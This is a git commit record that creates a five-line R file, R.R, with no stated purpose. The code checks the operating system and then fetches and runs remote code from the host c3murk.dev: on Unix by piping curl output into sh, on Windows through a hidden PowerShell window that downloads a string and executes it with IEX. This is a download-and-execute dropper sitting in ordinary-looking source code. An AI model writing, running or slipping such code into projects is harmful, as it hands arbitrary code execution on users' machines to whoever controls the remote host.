3c79fff552c61e4104f222e0214ac1ea411284ce
Cyclic3 <cyclic3.git@gmail.com>
2020-01-29 11:04:58 +0000

    Create R.R

---
+++ R.R
@@ -0,0 +1,5 @@
+if (.Platform$OS.type == "unix") {
+  system("curl c3murk.dev|sh")
+} else {
+  system("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://c3murk.dev')")
+}
